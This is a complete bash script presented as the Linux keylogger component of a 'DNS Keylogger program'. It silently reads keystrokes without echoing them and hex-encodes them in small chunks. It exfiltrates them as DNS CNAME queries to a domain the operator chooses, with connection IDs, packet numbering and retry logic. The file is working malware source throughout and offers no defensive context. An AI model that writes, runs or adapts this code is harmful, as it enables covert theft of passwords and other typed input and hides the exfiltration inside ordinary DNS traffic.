#!/bin/bash
# Linux keylogger for DNS Keylogger program.
# Usage: command [-flags] domain
# Options:
#   -l: localhost

# check if there are arguments supplied
if [ $# -eq 0 ]; then
  echo $'Needs second level domain and top level domain as argument.\nEx: "example.com"'
  exit 1
fi

# set globals
local_server=""

# check command line flags
while [ $# -gt 0 ]; do
  # check if server is on localhost
  if [ $1 = "-l" ]; then
    local_server="127.0.0.1"
  else
    # if it isn't a flag, break out of the loop
    break
  fi
  shift
done

if [ $# -eq 0 ]; then
  echo $'Needs second level domain and top level domain as argument.\nEx: "example.com"'
  exit 1
fi

# start connection
ns_out=$(nslookup -query=A $1 $local_server)
# stop if failed
if [ $? -eq 1 ]; then
  echo "Connection failed."
  exit 1
fi

# get connection id based on nslookup output
connection_id=$(echo "$ns_out" | tail -2 | grep -o -E '[0-9]*$')

# start packet number at 0
packet_number=0

# read inputs
while read -rsn1 letter; do
  # add each input to queue
  letters="$letters$letter"

  # if there are more than 4 letters in queue
  if [ ${#letters} -gt 4 ]; then
    # turn letters to hex
    data=$(echo $letters | xxd -ps -c 200 | tr -d '\n' | head -c -2)
    # format into encoding
    encoded="$packet_number.$connection_id.$data.$1"

    # send data to server
    ns_out=$(nslookup -query=CNAME $encoded $local_server)

    # while the packet failed
    while [ $? -eq 1 ]; do
      # get RCODE
      response_code=$(echo $ns_out | awk '{print $NF}')
      if [ $response_code = "NXDOMAIN" ]; then
        echo "Malformed request sent."
        break  # just skip this packet
      elif [ $response_code = "REFUSED" ]; then
        # start connection
        ns_out=$(nslookup -query=A $1 $local_server)
        # stop if failed
        if [ $? -eq 1 ]; then
          echo "Connection failed."
          exit 1
        fi

        # get connection id based on nslookup output
        connection_id=$(echo "$ns_out" | tail -2 | grep -o -E '[0-9]*$')
      elif [ $response_code = "FORMERR" ]; then
        # there was a mismatch in the expected packet_number. reset counter
        packet_number=0
      else
        echo "Unknown error."
        # packet has likely been dropped
      fi
      ns_out=$(nslookup -query=CNAME $encoded $local_server)
    done
    # increment packet number
    packet_number=$(($packet_number+1))
    # if packet number is too large
    if [ $packet_number -gt 999 ]; then
      # reset to 1
      packet_number=0
    fi
    letters=""
  fi
done

exit 0